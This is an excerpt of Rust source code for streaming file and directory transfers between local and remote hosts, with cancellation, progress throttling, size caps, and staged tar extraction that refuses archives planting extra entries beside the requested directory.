    let argv = checked_probe_argv(host, op, args)?;
    // The script rides in argv (`sh -c`), so stdin carries no payload here.
    let capture = run_capture_or_cancel(&argv, &[], timeout, max_out, cancel)?;
    probe_result(capture)
}

/// Exit-code mapping for streaming probes, where stdout was sunk elsewhere
/// and only bounded stderr remains.
fn probe_status_result(status: i32, stderr: Vec<u8>) -> io::Result<()> {
    probe_result(Capture {
        status,
        stdout: Vec::new(),
        stderr,
    })
    .map(|_| ())
}

/// Shared cancellation for one in-flight transfer, cloned between the UI and
/// the op worker. `cancel` is idempotent; the pump threads check the flag
/// between chunks and the watchdog kills the in-flight child as soon as the
/// flag appears — the same kill path as the timeout.
#[derive(Clone, Default)]
pub(crate) struct CancelToken(std::sync::Arc<std::sync::atomic::AtomicBool>);

impl CancelToken {
    pub(crate) fn cancel(&self) {
        self.0.store(true, std::sync::atomic::Ordering::Release);
    }

    pub(crate) fn is_cancelled(&self) -> bool {
        self.0.load(std::sync::atomic::Ordering::Acquire)
    }
}

/// The cancellation outcome: `Interrupted`, so the UI can tell a deliberate
/// cancel apart from a failure and report a neutral "Cancelled" instead of
/// an error toast.
pub(crate) fn cancelled_error() -> io::Error {
    io::Error::new(io::ErrorKind::Interrupted, "transfer cancelled")
}

/// A throttled bytes-transferred report from a streaming transfer, shared
/// between the pump thread (sender) and the UI (receiver). Called at most
/// ~4 times per second (see `ProgressThrottle`).
pub(crate) type ProgressSink = std::sync::Arc<std::sync::Mutex<dyn FnMut(u64) + Send>>;

/// Per-transfer shared controls: user cancellation plus an optional progress
/// sink. Cheap to clone for the worker, the pump threads and the UI.
#[derive(Clone, Default)]
pub(crate) struct TransferControl {
    pub(crate) token: CancelToken,
    pub(crate) progress: Option<ProgressSink>,
}

/// Rate-limiter for progress reports: the first report always goes through,
/// then a report is emitted when at least ~250 ms elapsed or at least
/// 256 KiB moved since the last one — whichever comes first.
struct ProgressThrottle {
    last_emit: Option<std::time::Instant>,
    last_bytes: u64,
}

const PROGRESS_MIN_INTERVAL: Duration = Duration::from_millis(250);
const PROGRESS_MIN_STEP: u64 = 256 * 1024;

impl ProgressThrottle {
    fn new() -> Self {
        Self {
            last_emit: None,
            last_bytes: 0,
        }
    }

    /// `now` is a parameter so the policy is unit-testable without sleeping.
    fn should_emit(&mut self, now: std::time::Instant, bytes: u64) -> bool {
        let emit = match self.last_emit {
            None => true,
            Some(last) => {
                now.duration_since(last) >= PROGRESS_MIN_INTERVAL
                    || bytes.saturating_sub(self.last_bytes) >= PROGRESS_MIN_STEP
            }
        };
        if emit {
            self.last_emit = Some(now);
            self.last_bytes = bytes;
        }
        emit
    }
}

/// Emit one throttled progress report; the exact final total is emitted
/// unconditionally by `ProgressSinkGuard::finish` at the end of a stream.
fn report_progress(progress: &Option<ProgressSink>, throttle: &mut ProgressThrottle, bytes: u64) {
    if let Some(sink) = progress {
        if throttle.should_emit(std::time::Instant::now(), bytes) {
            if let Ok(mut sink) = sink.lock() {
                sink(bytes);
            }
        }
    }
}

fn report_progress_final(progress: &Option<ProgressSink>, bytes: u64) {
    if let Some(sink) = progress {
        if let Ok(mut sink) = sink.lock() {
            sink(bytes);
        }
    }
}

/// Compact human-readable byte counts for the transfer progress toast:
/// `512 B`, `12.4 MiB`, `1.0 GiB`. Plain bytes below 1 KiB, one decimal
/// above.
pub(crate) fn human_bytes(bytes: u64) -> String {
    const KIB: u64 = 1024;
    const MIB: u64 = KIB * 1024;
    const GIB: u64 = MIB * 1024;
    const TIB: u64 = GIB * 1024;
    if bytes < KIB {
        format!("{bytes} B")
    } else if bytes < MIB {
        format!("{:.1} KiB", bytes as f64 / KIB as f64)
    } else if bytes < GIB {
        format!("{:.1} MiB", bytes as f64 / MIB as f64)
    } else if bytes < TIB {
        format!("{:.1} GiB", bytes as f64 / GIB as f64)
    } else {
        format!("{:.1} TiB", bytes as f64 / TIB as f64)
    }
}

/// A monotonic-ish suffix making temp and relay names unique per attempt.
fn unique_suffix() -> u128 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|elapsed| elapsed.as_nanos())
        .unwrap_or(0)
}

/// Best-effort unlink of a partial download on every failure path; `disarm`
/// once the final rename has landed.
struct TempFileGuard(PathBuf);

impl TempFileGuard {
    fn disarm(self) {
        std::mem::forget(self);
    }
}

impl Drop for TempFileGuard {
    fn drop(&mut self) {
        let _ = std::fs::remove_file(&self.0);
    }
}

/// The watchdog half of a streaming transfer: poll the child while the pump
/// thread reports through `rx`. Only a FAILED pump (overflow, write error)
/// kills the child outright — a finished pump means the payload has moved
/// but the child may still be flushing it (`put` renames after stdin EOF),
/// so a successful pump keeps waiting for a natural exit until the deadline.
/// A cancelled token kills exactly like the timeout: same group kill, same
/// reap.
fn watchdog_streaming_child(
    child: &mut HelperChild,
    rx: &mpsc::Receiver<io::Result<()>>,
    timeout: Duration,
    token: &CancelToken,
) -> (i32, io::Result<()>) {
    let deadline = std::time::Instant::now() + timeout;
    let mut pump_outcome = None;
    loop {
        if pump_outcome.is_none() {
            if let Ok(outcome) = rx.try_recv() {
                if outcome.is_err() {
                    // The pump gave up: the child is stuck on a full pipe or
                    // a dead peer — kill it rather than waiting it out.
                    kill_process_group(child);
                    let status = child
                        .wait()
                        .map(|status| status.code().unwrap_or(-1))
                        .unwrap_or(-1);
                    return (status, outcome);
                }
                pump_outcome = Some(outcome);
            }
        }
        match child.try_wait() {
            Ok(Some(status)) => {
                let outcome = match pump_outcome {
                    Some(outcome) => outcome,
                    // The child exited without the pump reporting yet; EOF
                    // makes that report arrive promptly.
                    None => rx
                        .recv_timeout(Duration::from_millis(250))
                        .unwrap_or_else(|_| Err(io::Error::other("transfer pump died"))),
                };
                return (status.code().unwrap_or(-1), outcome);
            }
            Ok(None) => {}
            Err(error) => return (-1, Err(error)),
        }
        if token.is_cancelled() {
            kill_tree(child);
            // Let the pump observe the dead child and wind down.
            let _ = rx.recv_timeout(Duration::from_millis(250));
            return (-1, Err(cancelled_error()));
        }
        if std::time::Instant::now() >= deadline {
            kill_tree(child);
            let _ = rx.recv_timeout(Duration::from_millis(250));
            return (
                -1,
                Err(io::Error::new(
                    io::ErrorKind::TimedOut,
                    "remote-fs transfer timed out",
                )),
            );
        }
        std::thread::sleep(WATCHDOG_POLL_INTERVAL);
    }
}

fn transfer_cap_error(cap: u64) -> io::Error {
    io::Error::other(format!(
        "transfer exceeds the {} MiB limit",
        cap / (1024 * 1024)
    ))
}

/// Stream a probe's stdout into a new local file via a unique temp sibling,
/// one chunk at a time. The temp file is unlinked on any failure; `dst`
/// appears only through the final rename, after a last existence check.
fn stream_download_to_file(
    argv: &[String],
    dst: &Path,
    cap: u64,
    timeout: Duration,
    control: TransferControl,
) -> io::Result<()> {
    fail_if_exists(dst)?;
    if control.token.is_cancelled() {
        return Err(cancelled_error());
    }
    let Some(file_name) = dst.file_name() else {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "download target has no file name",
        ));
    };
    let temp = dst.with_file_name(format!(
        ".{}.fspart-{}-{}",
        file_name.to_string_lossy(),
        std::process::id(),
        unique_suffix()
    ));
    use std::os::unix::fs::OpenOptionsExt;
    let mut file = std::fs::OpenOptions::new()
        .write(true)
        .create_new(true)
        .mode(0o600)
        .open(&temp)?;
    let temp_guard = TempFileGuard(temp.clone());

    let mut child = spawn_argv(argv, Stdio::null(), Stdio::piped(), Stdio::piped())?;
    child.pipes.set_timeout(timeout);
    let stderr_reader = spawn_bounded_reader(child.stderr.take(), PROBE_OP_MAX_OUTPUT);
    let Some(mut stdout) = child.stdout.take() else {
        return Err(io::Error::other("could not open probe stdout"));
    };
    let (tx, rx) = mpsc::channel::<io::Result<()>>();
    let stream_control = control.clone();
    std::thread::Builder::new()
        .name("forge-remote-fs-dl".to_string())
        .spawn(move || {
            let mut total = 0_u64;
            let mut buffer = vec![0_u8; STREAM_CHUNK];
            let mut throttle = ProgressThrottle::new();
            let result = loop {
                if stream_control.token.is_cancelled() {
                    break Err(cancelled_error());
                }
                match stdout.read(&mut buffer) {
                    Ok(0) => break Ok(total),
                    Ok(read) => {
                        total += read as u64;
                        if total > cap {
                            break Err(transfer_cap_error(cap));
                        }
                        if let Err(error) = file.write_all(&buffer[..read]) {
                            break Err(error);
                        }
                        report_progress(&stream_control.progress, &mut throttle, total);
                    }
                    Err(error) => break Err(error),
                }
            };
            if let Ok(total) = result {
                report_progress_final(&stream_control.progress, total);
            }
            let result = result.and_then(|total| file.sync_all().map(|_| total));
            let _ = tx.send(result.map(|_| ()));
        })
        .map_err(|error| io::Error::other(format!("could not start download streamer: {error}")))?;

    let (status, outcome) = watchdog_streaming_child(&mut child, &rx, timeout, &control.token);
    // Cancellation is never an error detail: it wins over exit-status noise.
    if control.token.is_cancelled() {
        return Err(cancelled_error());
    }
    let stderr = join_bounded_reader(stderr_reader);
    if status == -1 {
        return outcome.and_then(|_| Err(io::Error::other("probe died to a signal")));
    }
    probe_status_result(status, stderr?.0)?;
    outcome?;
    finalize_download(&temp, dst)?;
    temp_guard.disarm();
    Ok(())
}

/// Commit a finished download. The pre-check gives the readable error; the
/// no-replace rename is what actually prevents clobbering a `dst` created
/// during the transfer. Called with the temp file still guarded, so a failure
/// here still unlinks the partial download.
fn finalize_download(temp: &Path, dst: &Path) -> io::Result<()> {
    fail_if_exists(dst)?;
    rename_noreplace(temp, dst)
}

/// Stream a local regular file into a probe's stdin (`put` payload). The
/// remote side's exit code takes precedence over local write errors: an
/// early `exit 17` surfaces as AlreadyExists, not as a broken pipe.
fn stream_upload_to_probe(
    argv: &[String],
    src: &Path,
    cap: u64,
    timeout: Duration,
    control: TransferControl,
) -> io::Result<()> {
    let metadata = std::fs::symlink_metadata(src)?;
    if !metadata.file_type().is_file() {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "upload source is not a regular file",
        ));
    }
    if metadata.len() > cap {
        return Err(transfer_cap_error(cap));
    }
    if control.token.is_cancelled() {
        return Err(cancelled_error());
    }
    use std::os::unix::fs::OpenOptionsExt;
    let mut file = std::fs::OpenOptions::new()
        .read(true)
        .custom_flags(nix::libc::O_NOFOLLOW | nix::libc::O_NONBLOCK)
        .open(src)?;
    let opened = file.metadata()?;
    if !opened.is_file() {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "upload source is not a regular file",
        ));
    }
    if opened.len() > cap {
        return Err(transfer_cap_error(cap));
    }

    let mut child = spawn_argv(argv, Stdio::piped(), Stdio::null(), Stdio::piped())?;
    child.pipes.set_timeout(timeout);
    let stderr_reader = spawn_bounded_reader(child.stderr.take(), PROBE_OP_MAX_OUTPUT);
    let Some(mut stdin) = child.stdin.take() else {
        return Err(io::Error::other("could not open probe stdin"));
    };
    let (tx, rx) = mpsc::channel::<io::Result<()>>();
    let stream_control = control.clone();
    std::thread::Builder::new()
        .name("forge-remote-fs-ul".to_string())
        .spawn(move || {
            let mut total = 0_u64;
            let mut buffer = vec![0_u8; STREAM_CHUNK];
            let mut throttle = ProgressThrottle::new();
            let result = loop {
                if stream_control.token.is_cancelled() {
                    break Err(cancelled_error());
                }
                match file.read(&mut buffer) {
                    Ok(0) => break Ok(total),
                    Ok(read) => {
                        total += read as u64;
                        // The file grew past the cap mid-stream. Kill happens
                        // on the calling side; the remote temp is orphaned but
                        // no truncated file is moved into place.
                        if total > cap {
                            break Err(transfer_cap_error(cap));
                        }
                        if let Err(error) = stdin.write_all(&buffer[..read]) {
                            break Err(error);
                        }
                        report_progress(&stream_control.progress, &mut throttle, total);
                    }
                    Err(error) => break Err(error),
                }
            };
            if let Ok(total) = result {
                report_progress_final(&stream_control.progress, total);
            }
            let _ = tx.send(result.map(|_| ()));
        })
        .map_err(|error| io::Error::other(format!("could not start upload streamer: {error}")))?;

    let (status, outcome) = watchdog_streaming_child(&mut child, &rx, timeout, &control.token);
    if control.token.is_cancelled() {
        return Err(cancelled_error());
    }
    let stderr = join_bounded_reader(stderr_reader);
    if status == -1 {
        return outcome.and_then(|_| Err(io::Error::other("probe died to a signal")));
    }
    probe_status_result(status, stderr?.0)?;
    outcome?;
    Ok(())
}

/// Directory transfers shell out to the system tar on BOTH ends; check the
/// local side up-front so the error names the real problem.
fn local_tar_available() -> io::Result<()> {
    match Command::new("tar")
        .arg("--version")
        .stdin(Stdio::null())
        .stdout(Stdio::null())
        .stderr(Stdio::null())
        .status()
    {
        Ok(status) if status.success() => Ok(()),
        Ok(_) => Err(io::Error::other("local `tar` is present but not working")),
        Err(error) if error.kind() == io::ErrorKind::NotFound => Err(io::Error::other(
            "directory transfers need a local `tar` binary",
        )),
        Err(error) => Err(error),
    }
}

fn local_tar_create_argv(src: &Path) -> io::Result<Vec<String>> {
    let Some(name) = src.file_name() else {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "tar source has no file name",
        ));
    };
    let parent = src.parent().unwrap_or_else(|| Path::new("/"));
    Ok(vec![
        "tar".to_string(),
        "cf".to_string(),
        "-".to_string(),
        "-C".to_string(),
        parent.to_string_lossy().into_owned(),
        "--".to_string(),
        name.to_string_lossy().into_owned(),
    ])
}

/// Pump `reader` → `writer` in chunks with a byte cap. On overflow the
/// `source_child` (the producing tar) is killed so it cannot linger blocked
/// on a full pipe; IO errors and cancellation kill it too, then it is reaped.
fn pump_capped(
    mut reader: impl Read,
    mut writer: impl Write,
    mut source_child: HelperChild,
    cap: u64,
    timeout: Duration,
    control: TransferControl,
) -> io::Result<()> {
    let mut total = 0_u64;
    let mut buffer = vec![0_u8; STREAM_CHUNK];
    let mut throttle = ProgressThrottle::new();
    let result = loop {
        if control.token.is_cancelled() {
            break Err(cancelled_error());
        }
        match reader.read(&mut buffer) {
            Ok(0) => break Ok(()),
            Ok(read) => {
                total += read as u64;
                if total > cap {
                    break Err(transfer_cap_error(cap));
                }
                if let Err(error) = writer.write_all(&buffer[..read]) {
                    break Err(error);
                }
                report_progress(&control.progress, &mut throttle, total);
            }
            Err(error) => break Err(error),
        }
    };
    drop(writer); // EOF for the consumer
    if result.is_ok() {
        report_progress_final(&control.progress, total);
    } else {
        kill_process_group(&mut source_child);
    }
    // Reap the producer; after EOF it exits on its own, after a failure the
    // kill above needs a wait to collect.
    match wait_with_timeout(&mut source_child, timeout) {
        Ok(status) if result.is_ok() => match status.code() {
            Some(0) => Ok(()),
            Some(code) => Err(io::Error::other(format!(
                "local tar exited with status {code}"
            ))),
            None => Err(io::Error::other("local tar died to a signal")),
        },
        Ok(_) => result,
        Err(error) => Err(error),
    }
}

/// Download one regular file from a remote host to `dst`, streaming.
pub(crate) fn download_file(
    host: &RemoteHost,
    src: &Path,
    dst: &Path,
    control: &TransferControl,
) -> io::Result<()> {
    if control.token.is_cancelled() {
        return Err(cancelled_error());
    }
    let argv = checked_probe_argv(host, "cat", &[remote_path_arg(src)?])?;
    stream_download_to_file(
        &argv,
        dst,
        MAX_TRANSFER_BYTES,
        TRANSFER_TIMEOUT,
        control.clone(),
    )
}

/// Upload one regular local file to `dst` on a remote host, streaming. A
/// `stat` probe refuses an existing `dst` before any byte moves; the probe
/// writes a private staged file, checks its declared size, and publishes with
/// an atomic no-replace hard link.
pub(crate) fn upload_file(
    host: &RemoteHost,
    src: &Path,
    dst: &Path,
    control: &TransferControl,
) -> io::Result<()> {
    if control.token.is_cancelled() {
        return Err(cancelled_error());
    }
    // Friendly pre-flight refusal; the probe's own exit-17 checks remain the
    // atomic enforcement behind it.
    if remote_stat(host, dst)?.is_some() {
        return Err(already_exists(dst));
    }
    let expected_size = std::fs::symlink_metadata(src)?.len().to_string();
    let argv = checked_probe_argv(host, "put", &[remote_path_arg(dst)?, &expected_size])?;
    stream_upload_to_probe(
        &argv,
        src,
        MAX_TRANSFER_BYTES,
        TRANSFER_TIMEOUT,
        control.clone(),
    )
}

/// A private, process-owned directory to extract an untrusted archive into.
///
/// It is created as a sibling of the download target so the finished tree can
/// be published with a same-filesystem rename, and with `create_dir`, which
/// fails rather than reusing anything that is already at that path.
struct DownloadStaging {
    path: PathBuf,
}

impl DownloadStaging {
    fn create(parent: &Path) -> io::Result<Self> {
        use std::os::unix::fs::DirBuilderExt;
        static NONCE: std::sync::atomic::AtomicU64 = std::sync::atomic::AtomicU64::new(0);
        let nonce = NONCE.fetch_add(1, std::sync::atomic::Ordering::Relaxed);
        let path = parent.join(format!(".forge-download.{}.{nonce}", std::process::id()));
        std::fs::DirBuilder::new()
            .mode(0o700)
            .create(&path)
            .map_err(|error| {
                io::Error::other(format!(
                    "could not create a private staging directory in {}: {error}",
                    parent.display()
                ))
            })?;
        Ok(Self { path })
    }
}

impl Drop for DownloadStaging {
    /// Always: on failure this removes the partial extraction, and on success
    /// it removes the now-empty shell the published tree was renamed out of.
    fn drop(&mut self) {
        let _ = std::fs::remove_dir_all(&self.path);
    }
}

/// The one entry a directory download is allowed to have produced.
///
/// A remote host answering a download of `~/proj` is asked for a tar of one
/// directory, but it decides what the archive actually contains. Extracting
/// straight into the target's parent — which is where the tree has to end up —
/// let it deliver `proj/...` *and* ordinary relative siblings beside it:
/// `.bashrc`, `.ssh/authorized_keys`, `.config/forge/config.toml`. Nothing
/// about those paths is exotic enough for tar to refuse them, and they landed
/// in the user's home directory. So extraction happens somewhere private, and
/// the result is only published after it is shown to be the single expected
/// top-level component and nothing else.
fn validated_staged_tree(staging: &Path, expected: &std::ffi::OsStr) -> io::Result<PathBuf> {
    let mut entries = Vec::new();
    for entry in std::fs::read_dir(staging)? {
        entries.push(entry?.file_name());
        if entries.len() > 1 {
            break;
        }
    }
    let [name] = entries.as_slice() else {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            format!(
                "the remote host sent {} top-level entries for one directory; refusing to publish any of them",
                entries.len()
            ),
        ));
    };
    if name.as_os_str() != expected {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            "the remote host sent an archive whose top-level entry is not the requested directory",
        ));
    }
    let staged = staging.join(name);
    // A top-level symlink would publish a link pointing anywhere the host
    // chose, under a name the user believes is their own copy of the tree.
    if !std::fs::symlink_metadata(&staged)?.is_dir() {
        return Err(io::Error::new(
            io::ErrorKind::InvalidData,
            "the remote host sent something other than a directory for a directory download",
        ));
    }
    Ok(staged)
}

/// Download a remote directory tree to `dst` (which must not exist): the probe
/// streams a tar of the directory, the local system tar extracts it into a
/// private staging directory beside `dst`, and only a tree that turns out to be
/// exactly the one requested directory is renamed into place. Staging is
/// removed on every other path.
pub(crate) fn download_dir(
    host: &RemoteHost,
    src: &Path,
    dst: &Path,
    control: &TransferControl,
) -> io::Result<()> {
    if control.token.is_cancelled() {
        return Err(cancelled_error());
    }
    let argv = checked_probe_argv(host, "tar", &[remote_path_arg(src)?])?;
    fail_if_exists(dst)?;
    local_tar_available()?;
    let Some(parent) = dst.parent() else {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "download target has no parent directory",
        ));
    };
    let Some(name) = dst.file_name() else {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "download target has no file name",
        ));
    };
    let staging = DownloadStaging::create(parent)?;
    let local_argv = vec![
        "tar".to_string(),
        "xf".to_string(),
        "-".to_string(),
        "-C".to_string(),
        staging.path.to_string_lossy().into_owned(),
    ];

    stream_download_dir(
        &argv,
        &local_argv,
        MAX_TRANSFER_BYTES,
        TRANSFER_TIMEOUT,
        control.clone(),
    )?;
    let staged = validated_staged_tree(&staging.path, name)?;
    // `dst` was proved absent before the transfer — minutes ago, for a large
    // tree — so the commit carries the guarantee rather than the check. The
    // kernel already refuses to replace a non-empty directory or a file, but an
    // empty directory created in that window would be swallowed silently.
    // Staging is still removed by the guard, which by then holds only an empty
    // directory.
    rename_noreplace(&staged, dst)?;
    Ok(())
}

fn stream_download_dir(
    argv: &[String],
    local_argv: &[String],
    cap: u64,
    timeout: Duration,
    control: TransferControl,
) -> io::Result<()> {
    if control.token.is_cancelled() {
        return Err(cancelled_error());
    }
    let mut remote = spawn_argv(argv, Stdio::null(), Stdio::piped(), Stdio::piped())?;
    remote.pipes.set_timeout(timeout);
    let remote_stderr = spawn_bounded_reader(remote.stderr.take(), PROBE_OP_MAX_OUTPUT);
    let mut local = spawn_argv(local_argv, Stdio::piped(), Stdio::null(), Stdio::piped())?;
    local.pipes.set_timeout(timeout);
    let local_stderr = spawn_bounded_reader(local.stderr.take(), PROBE_OP_MAX_OUTPUT);
    let Some(remote_stdout) = remote.stdout.take() else {
        return Err(io::Error::other("could not open probe stdout"));
    };
    let Some(local_stdin) = local.stdin.take() else {
        return Err(io::Error::other("could not open local tar stdin"));
    };

    let (tx, rx) = mpsc::channel::<io::Result<()>>();
    let pump_control = control.clone();
    std::thread::Builder::new()
        .name("forge-remote-fs-dldir".to_string())
        .spawn(move || {
            // The "source child" here is the local extractor: a pump failure
            // must kill it so it cannot linger waiting for stdin.
            let outcome = pump_capped(
                remote_stdout,
                local_stdin,
                local,
                cap,
                timeout,
                pump_control,
            );
            let _ = tx.send(outcome);
        })
        .map_err(|error| io::Error::other(format!("could not start download pump: {error}")))?;

    let (status, outcome) = watchdog_streaming_child(&mut remote, &rx, timeout, &control.token);
    if control.token.is_cancelled() {
        return Err(cancelled_error());
    }
    probe_status_result(status, join_bounded_reader(remote_stderr)?.0)?;
    outcome?;
    let local_err = String::from_utf8_lossy(&join_bounded_reader(local_stderr)?.0)
        .trim()
        .to_string();
    if !local_err.is_empty() {
        log::warn!("local tar reported during directory download: {local_err}");
    }
    Ok(())
}

/// Upload a local directory tree to `dst` on a remote host (which must not
/// exist): a `stat` probe refuses an existing `dst` up-front, then the local
/// system tar streams the tree into the probe's `untar <parent> <name>`,
/// which extracts privately and atomically publishes without replacement.
/// Failed uploads never remove a destination that another creator may own.
pub(crate) fn upload_dir(
    host: &RemoteHost,
    src: &Path,
    dst: &Path,
    control: &TransferControl,
) -> io::Result<()> {
    if control.token.is_cancelled() {
        return Err(cancelled_error());
    }
    local_tar_available()?;
    if !src.is_dir() {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "upload source is not a directory",
        ));
    }
    let Some(name) = dst.file_name() else {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "upload target has no file name",
        ));
    };
    // The local tar carries the source's top-level name, so the destination
    // must keep it: extracting under a different name would silently create
    // a path the caller never asked for.
    if src.file_name() != Some(name) {
        return Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "upload target name must match the source directory name",
        ));
    }
    let name_arg = name.to_str().ok_or_else(|| {
        io::Error::new(
            io::ErrorKind::InvalidInput,
            "upload target name is not valid UTF-8",
        )
    })?;
    let parent = dst.parent().unwrap_or_else(|| Path::new("/"));
    let parent_arg = remote_path_arg(parent)?;
    if remote_stat(host, dst)?.is_some() {
        return Err(already_exists(dst));
    }
    let local_argv = local_tar_create_argv(src)?;
    let remote_argv = checked_probe_argv(host, "untar", &[parent_arg, name_arg])?;
    stream_upload_dir(
        &local_argv,
        &remote_argv,
        MAX_TRANSFER_BYTES,
        TRANSFER_TIMEOUT,
        control.clone(),
    )
}

fn stream_upload_dir(
    local_argv: &[String],
    remote_argv: &[String],
    cap: u64,
    timeout: Duration,
    control: TransferControl,
) -> io::Result<()> {
    // A producer can write a complete-looking archive and still fail on a
    // later entry. Validate its exit status before any remote publication.
    if control.token.is_cancelled() {
        return Err(cancelled_error());
    }
    let started = std::time::Instant::now();
    let staging = DownloadStaging::create(&std::env::temp_dir())?;
    let archive = staging.path.join("archive.tar");
    stream_download_to_file(
        local_argv,
        &archive,
        cap,
        timeout,
        TransferControl {
            token: control.token.clone(),
            progress: None,
        },
    )?;
    let remaining = timeout.checked_sub(started.elapsed()).ok_or_else(|| {
        io::Error::new(
            io::ErrorKind::TimedOut,
            "directory upload timed out while archiving",
        )
    })?;
    stream_upload_to_probe(remote_argv, &archive, cap, remaining, control)
}

/// Which leg a cross-location paste needs. Same-location pastes return
/// `None`: the plain copy/rename ops handle those.
#[derive(Clone, Copy, PartialEq, Eq, Debug)]
pub(crate) enum TransferPlan {
    /// Clipboard remote, tree local.
    Download,
    /// Clipboard local, tree remote.
    Upload,
    /// Two different remote hosts, relayed through a local temp path.
    Relay,
}

#[derive(Clone, Debug, Hash, PartialEq, Eq)]
pub(crate) enum FilesystemIdentity {
    Local,
    Remote {
        docker: bool,
        host: String,
        user: Option<String>,
        stable_ssh_args: Vec<String>,
    },
}

pub(crate) fn filesystem_identity(
    loc: &FsLocation,
    hosts: &[RemoteHost],
) -> io::Result<FilesystemIdentity> {
    let Some(host) = remote_host(loc, hosts)? else {
        return Ok(FilesystemIdentity::Local);
    };
    Ok(FilesystemIdentity::Remote {
        docker: host.docker,
        host: host.host,
        user: host.user,
        stable_ssh_args: if host.docker {
            Vec::new()
        } else {
            stable_ssh_args(&host.ssh_args)?
        },
    })
}

/// Whether two saved/transient representations address the same filesystem
/// namespace. ControlPath is intentionally absent from this identity; it is
/// selected separately as execution material for a same-target paste.
pub(crate) fn same_filesystem(from: &FsLocation, to: &FsLocation, hosts: &[RemoteHost]) -> bool {
    filesystem_identity(from, hosts)
        .and_then(|from| filesystem_identity(to, hosts).map(|to| from == to))
        .unwrap_or(false)
}

fn location_has_configured_control_path(loc: &FsLocation, hosts: &[RemoteHost]) -> bool {
    remote_host(loc, hosts)
        .ok()
        .flatten()
        .filter(|host| !host.docker)
        .is_some_and(|host| {
            ssh_args_without_control_path(&host.ssh_args).is_ok_and(|(_, removed)| removed)
        })
}

/// Choose one immutable execution endpoint for a direct copy/rename between
/// two representations of the same filesystem. A process-observed socket is
/// strongest, followed by an explicit ControlPath baked into either saved
/// profile. This is intentionally independent from namespace identity: the
/// socket is used for execution without turning paste into a cross-host relay.
pub(crate) fn same_filesystem_execution_endpoint<'a>(
    from: &'a FsLocation,
    from_overlay: &'a FsExecutionOverlay,
    to: &'a FsLocation,
    to_overlay: &'a FsExecutionOverlay,
    hosts: &[RemoteHost],
) -> (&'a FsLocation, &'a FsExecutionOverlay) {
    debug_assert!(same_filesystem(from, to, hosts));
    if !to_overlay.is_empty() {
        return (to, to_overlay);
    }
    if !from_overlay.is_empty() {
        return (from, from_overlay);
    }
    if location_has_configured_control_path(to, hosts) {
        return (to, to_overlay);
    }
    if location_has_configured_control_path(from, hosts) {
        return (from, from_overlay);
    }
    if matches!(to, FsLocation::Remote(_)) {
        (to, to_overlay)
    } else {
        (from, from_overlay)
    }
}

pub(crate) fn transfer_plan(from: &FsLocation, to: &FsLocation) -> Option<TransferPlan> {
    if from == to {
        return None;
    }
    Some(match (from.is_remote(), to.is_remote()) {
        (true, false) => TransferPlan::Download,
        (false, true) => TransferPlan::Upload,
        (true, true) => TransferPlan::Relay,
        // `from == to` was rejected above, so both-Local cannot reach here.
        (false, false) => unreachable!(),
    })
}

pub(crate) fn transfer_plan_with_hosts(
    from: &FsLocation,
    to: &FsLocation,
    hosts: &[RemoteHost],
) -> Option<TransferPlan> {
    if same_filesystem(from, to, hosts) {
        return None;
    }
    Some(match (from.is_remote(), to.is_remote()) {
        (true, false) => TransferPlan::Download,
        (false, true) => TransferPlan::Upload,
        (true, true) => TransferPlan::Relay,
        (false, false) => unreachable!(),
    })
}

/// One cross-location transfer unit: download, upload, or a temp-relayed
/// remote-to-remote hop. `dst` must not exist anywhere along the way; every
/// leg pre-checks existence before a payload byte moves. `control` carries
/// the cancellation token and optional progress sink through every leg.
pub(crate) fn transfer(
    from: &FsLocation,
    hosts: &[RemoteHost],
    src: &Path,
    to: &FsLocation,
    dst: &Path,
    is_dir: bool,
    control: &TransferControl,
) -> io::Result<()> {
    transfer_with_overlays(
        from,
        &FsExecutionOverlay::default(),
        hosts,
        src,
        to,
        &FsExecutionOverlay::default(),
        dst,
        is_dir,
        control,
    )
}

#[allow(clippy::too_many_arguments)] // One immutable authority + path per leg, plus item metadata/control.
pub(crate) fn transfer_with_overlays(
    from: &FsLocation,
    from_overlay: &FsExecutionOverlay,
    hosts: &[RemoteHost],
    src: &Path,
    to: &FsLocation,
    to_overlay: &FsExecutionOverlay,
    dst: &Path,
    is_dir: bool,
    control: &TransferControl,
) -> io::Result<()> {
    match (
        remote_host_with_overlay(from, hosts, from_overlay)?,
        remote_host_with_overlay(to, hosts, to_overlay)?,
    ) {
        (Some(src_host), None) => {
            if is_dir {
                download_dir(&src_host, src, dst, control)
            } else {
                download_file(&src_host, src, dst, control)
            }
        }
        (None, Some(dst_host)) => {
            if is_dir {
                upload_dir(&dst_host, src, dst, control)
            } else {
                upload_file(&dst_host, src, dst, control)
            }
        }
        (Some(src_host), Some(dst_host)) => {
            transfer_relay(&src_host, src, &dst_host, dst, is_dir, control)
        }
        (None, None) => Err(io::Error::new(
            io::ErrorKind::InvalidInput,
            "same-location transfer must use copy or rename",
        )),
    }
}

/// Remote-to-remote hops relay through a unique local temp path: download,
/// upload, clean up. The temp side never survives the call.
fn transfer_relay(
    src_host: &RemoteHost,
    src: &Path,
    dst_host: &RemoteHost,
    dst: &Path,
    is_dir: bool,
    control: &TransferControl,
) -> io::Result<()> {
    let relay = std::env::temp_dir().join(format!(
        "forge-fs-relay-{}-{}",
        std::process::id(),
        unique_suffix()
    ));
    if is_dir {
        let Some(name) = src.file_name() else {
            return Err(io::Error::new(
                io::ErrorKind::InvalidInput,
                "transfer source has no file name",
            ));
        };
        std::fs::create_dir(&relay)?;
        let staged = relay.join(name);
        let result = download_dir(src_host, src, &staged, control)
            .and_then(|_| upload_dir(dst_host, &staged, dst, control));
        let _ = std::fs::remove_dir_all(&relay);
        result
    } else {
        let result = download_file(src_host, src, &relay, control)
            .and_then(|_| upload_file(dst_host, &relay, dst, control));
        let _ = std::fs::remove_file(&relay);
        result
    }
}

/// Cut semantics for cross-location moves: copy first, delete the source only
/// after the copy landed, and say so plainly when only the copy succeeded.
